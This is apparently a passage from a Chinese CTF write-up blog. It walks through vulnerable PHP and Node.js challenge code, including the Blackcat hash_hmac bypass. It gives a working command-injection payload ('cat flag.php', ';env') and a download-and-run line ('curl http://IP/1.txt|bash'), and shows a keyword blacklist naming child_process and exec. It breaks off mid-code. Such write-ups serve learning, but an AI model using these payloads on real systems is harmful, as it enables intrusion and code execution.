<span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-comment">// 使缓存文件名随机</span><br>        <span class="hljs-variable">$cache_filename</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cache_filename</span>, -<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;.php&#x27;</span>)) === <span class="hljs-string">&#x27;.php&#x27;</span>) &#123;<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;?&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache_filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure>



<h2 id="羊城杯-2020-Blackcat"><a href="#羊城杯-2020-Blackcat" class="headerlink" title="[羊城杯 2020]Blackcat"></a>[羊城杯 2020]Blackcat</h2><p>右键源码，<code>mp3</code>文件中存在：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;谁！竟敢踩我一只耳的尾巴！&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>]))<br>    <span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;有意瞄准，无意击发，你的梦想就是你要瞄准的目标。相信自己，你就是那颗射中靶心的子弹。&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br><br></code></pre></td></tr></table></figure>

<p>代码倒是不难理解：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<span class="hljs-comment">//这里获取了环境变量中clandestine的值，后面会把它当成加密密钥</span><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;White-cat-monitor&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<span class="hljs-comment">//使用刚才那个加密密钥+sha256算法对POST的对应内容进行加密，然后赋值给$clandestine，这东西是下一段加密的密钥</span><br><span class="hljs-variable">$hh</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>], <span class="hljs-variable">$clandestine</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$hh</span> !== <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>])<span class="hljs-comment">//这里如果相等会执行：</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&quot;nc&quot;</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]);<br></code></pre></td></tr></table></figure>

<p><code>hash_hmac</code>这东西特性和<code>md5</code>一样，如果给一个数组加密他直接就返回<code>NULL</code>了(不考虑报错)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-number">0</span>];<br><br><span class="hljs-variable">$hmac</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$key</span>);<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$hmac</span>);<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果:</span><br>Warning: <span class="hljs-title function_ invoke__">hash_hmac</span>() expects parameter <span class="hljs-number">2</span> to be <span class="hljs-keyword">string</span>, <span class="hljs-keyword">array</span> given in /box/script.php on line <span class="hljs-number">4</span><br><span class="hljs-literal">NULL</span><br></code></pre></td></tr></table></figure>

<p><code>One-ear</code>就是后面要执行的命令，现在密钥有了很容易求对应加密出的<code>$hh</code></p>
<p>接下来是<code>exec</code>命令执行：</p>
<p><code>exec</code>命令执行有关回显的问题：</p>
<p>首先这东西只返回命令执行结果的最后一行，而不会将输出直接发送到浏览器或者命令行(不过题目中和<code>echo</code>搭配使用了)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>);<span class="hljs-comment">//这东西没输出</span><br><br><span class="hljs-keyword">echo</span>(<span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-string">&#x27;ls&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//结果：</span><br>run<br>script.php<br>script.php<br></code></pre></td></tr></table></figure>



<p>前面放了个<code>nc</code>所以要用分号给它分开(类似<code>system</code>同时执行多个命令)。</p>
<p>先是很多师傅用的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//生成hash</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$data</span> = [<span class="hljs-number">0</span>];<br><span class="hljs-variable">$key</span> = <span class="hljs-literal">NULL</span>;<br><span class="hljs-variable">$data2</span> = <span class="hljs-string">&#x27;;cat flag.php&#x27;</span>;<br><span class="hljs-variable">$hmac2</span> = <span class="hljs-title function_ invoke__">hash_hmac</span>(<span class="hljs-string">&#x27;sha256&#x27;</span>, <span class="hljs-variable">$data2</span>, <span class="hljs-variable">$key</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$hmac2</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-variable">$one</span><span class="hljs-attribute">-ear</span>=;cat flag.php<br>这时加密密钥变成了<span class="hljs-literal">NULL</span><br>payload:<br>White-cat-monitor[]=0&amp;<span class="hljs-attribute">One-ear</span>=;cat flag.php&amp;<span class="hljs-attribute">Black-Cat-Sheriff</span>=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6<br></code></pre></td></tr></table></figure>

<p>这里其实不知道为啥直接<code>cat flag.php</code>了，感觉<code>ls</code>没太大作用。<code>buu</code>的话<code>flag</code>在环境变量里，payload换成<code>;env</code>就行，或者反弹shell:<code>curl http://IP/1.txt|bash</code></p>
<h4 id="思路总结：-5"><a href="#思路总结：-5" class="headerlink" title="思路总结："></a>思路总结：</h4><p>hash加密，exec命令执行。</p>
<h2 id="GYCTF2020-Node-Game"><a href="#GYCTF2020-Node-Game" class="headerlink" title="[GYCTF2020]Node Game"></a>[GYCTF2020]Node Game</h2><p><code>js</code>的题？顺便查了下<code>pug</code>，一个模板引擎。</p>
<p>![1GYCTF2020Node Game](img&#x2F;1GYCTF2020Node Game.png)</p>
<p>上面的链接直接给了源码，注意这个<code>URL</code>：<code>core?q=source</code></p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// 引入所需的模块</span><br><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> app = <span class="hljs-title function_">express</span>();<br><span class="hljs-keyword">var</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);<br><span class="hljs-keyword">var</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;path&#x27;</span>);<br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><span class="hljs-keyword">var</span> pug = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;pug&#x27;</span>);<br><span class="hljs-keyword">var</span> morgan = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;morgan&#x27;</span>);<br><span class="hljs-keyword">const</span> multer = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;multer&#x27;</span>);<br><br><span class="hljs-comment">// 设置中间件</span><br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">multer</span>(&#123; <span class="hljs-attr">dest</span>: <span class="hljs-string">&#x27;./dist&#x27;</span> &#125;).<span class="hljs-title function_">array</span>(<span class="hljs-string">&#x27;file&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-title function_">morgan</span>(<span class="hljs-string">&#x27;short&#x27;</span>));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/uploads&quot;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/uploads&#x27;</span>)));<br>app.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;/template&quot;</span>, express.<span class="hljs-title function_">static</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">&#x27;/template&#x27;</span>)));<br><br><span class="hljs-comment">// 处理根路径的GET请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> action = req.<span class="hljs-property">query</span>.<span class="hljs-property">action</span> ? req.<span class="hljs-property">query</span>.<span class="hljs-property">action</span> : <span class="hljs-string">&quot;index&quot;</span>;<br><br>    <span class="hljs-comment">// 阻止包含斜杠的请求</span><br>    <span class="hljs-keyword">if</span> (action.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;/&quot;</span>) || action.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&quot;\\&quot;</span>)) &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;Errrrr, You have been Blocked&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">var</span> file = path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/template/&#x27;</span> + action + <span class="hljs-string">&#x27;.pug&#x27;</span>);<br>    <span class="hljs-keyword">var</span> html = pug.<span class="hljs-title function_">renderFile</span>(file);<br>    res.<span class="hljs-title function_">send</span>(html);<br>&#125;);<br><br><span class="hljs-comment">// 处理文件上传的POST请求</span><br>app.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/file_upload&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> ip = req.<span class="hljs-property">connection</span>.<span class="hljs-property">remoteAddress</span>;<br>    <span class="hljs-keyword">var</span> obj = &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;&#x27;</span> &#125;;<br><br>    <span class="hljs-comment">// 只允许特定IP进行文件上传</span><br>    <span class="hljs-keyword">if</span> (!ip.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>)) &#123;<br>        obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&quot;only admin&#x27;s ip can use it&quot;</span>;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    fs.<span class="hljs-title function_">readFile</span>(req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">path</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">err, data</span>) &#123;<br>        <span class="hljs-keyword">if</span> (err) &#123;<br>            obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">var</span> file_path = <span class="hljs-string">&#x27;/uploads/&#x27;</span> + req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">mimetype</span> + <span class="hljs-string">&quot;/&quot;</span>;<br>            <span class="hljs-keyword">var</span> file_name = req.<span class="hljs-property">files</span>[<span class="hljs-number">0</span>].<span class="hljs-property">originalname</span>;<br>            <span class="hljs-keyword">var</span> dir_file = __dirname + file_path + file_name;<br><br>            <span class="hljs-comment">// 如果目录不存在，则创建目录</span><br>            <span class="hljs-keyword">if</span> (!fs.<span class="hljs-title function_">existsSync</span>(__dirname + file_path)) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    fs.<span class="hljs-title function_">mkdirSync</span>(__dirname + file_path);<br>                &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                    obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&quot;file type error&quot;</span>;<br>                    res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>                    <span class="hljs-keyword">return</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                fs.<span class="hljs-title function_">writeFileSync</span>(dir_file, data);<br>                obj = &#123; <span class="hljs-attr">msg</span>: <span class="hljs-string">&#x27;upload success&#x27;</span>, <span class="hljs-attr">filename</span>: file_path + file_name &#125;;<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                obj.<span class="hljs-property">msg</span> = <span class="hljs-string">&#x27;upload failed&#x27;</span>;<br>            &#125;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(obj));<br>        &#125;<br>    &#125;);<br>&#125;);<br><br><span class="hljs-comment">// 处理&#x27;/source&#x27;路径的GET请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    res.<span class="hljs-title function_">sendFile</span>(path.<span class="hljs-title function_">join</span>(__dirname + <span class="hljs-string">&#x27;/template/source.txt&#x27;</span>));<br>&#125;);<br><br><span class="hljs-comment">// 处理&#x27;/core&#x27;路径的GET请求</span><br>app.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/core&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">req, res</span>) &#123;<br>    <span class="hljs-keyword">var</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;<br>    <span class="hljs-keyword">var</span> resp = <span class="hljs-string">&quot;&quot;</span>;<br><br>    <span class="hljs-keyword">if</span> (q) &#123;<br>        <span class="hljs-keyword">var</span> url = <span class="hljs-string">&#x27;http://localhost:8081/source?&#x27;</span> + q;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(url);<br><br>        <span class="hljs-comment">// 检查URL是否包含黑名单关键词</span><br>        <span class="hljs-keyword">var</span> trigger = <span class="hljs-title function_">blacklist</span>(url);<br>        <span class="hljs-keyword">if</span> (trigger === <span class="hljs-literal">true</span>) &#123;<br>            res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;error occurs!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-comment">// 发送HTTP请求获取数据并转发给客户端</span><br>                http.<span class="hljs-title function_">get</span>(url, <span class="hljs-keyword">function</span>(<span class="hljs-params">resp</span>) &#123;<br>                    resp.<span class="hljs-title function_">setEncoding</span>(<span class="hljs-string">&#x27;utf8&#x27;</span>);<br>                    resp.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">err</span>) &#123;<br>                        <span class="hljs-keyword">if</span> (err.<span class="hljs-property">code</span> === <span class="hljs-string">&quot;ECONNRESET&quot;</span>) &#123;<br>                            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;Timeout occurs&quot;</span>);<br>                            <span class="hljs-keyword">return</span>;<br>                        &#125;<br>                    &#125;);<br>                    resp.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">chunk</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            resps = chunk.<span class="hljs-title function_">toString</span>();<br>                            res.<span class="hljs-title function_">send</span>(resps);<br>                        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>                            res.<span class="hljs-title function_">send</span>(e.<span class="hljs-property">message</span>);<br>                        &#125;<br>                    &#125;).<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;error&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">e</span>) =&gt;</span> &#123;<br>                        res.<span class="hljs-title function_">send</span>(e.<span class="hljs-property">message</span>);<br>                    &#125;);<br>                &#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>                <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error);<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        res.<span class="hljs-title function_">send</span>(<span class="hljs-string">&quot;search param &#x27;q&#x27; missing!&quot;</span>);<br>    &#125;<br>&#125;);<br><br><span class="hljs-comment">// 检查URL是否包含黑名单关键词的函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">blacklist</span>(<span class="hljs-params">url</span>) &#123;<br>    <span class="hljs-keyword">var</span> evilwords = [<span class="hljs-string">&quot;global&quot;</span>, <span class="hljs-string">&quot;process&quot;</span>, <span class="hljs-string">&quot;mainModule&quot;</span>, <span class="hljs-string">&quot;require&quot;</span>, <span class="hljs-string">&quot;root&quot;</span>, <span class="hljs-string">&quot;child_process&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;!&quot;</span>];<br>    <span 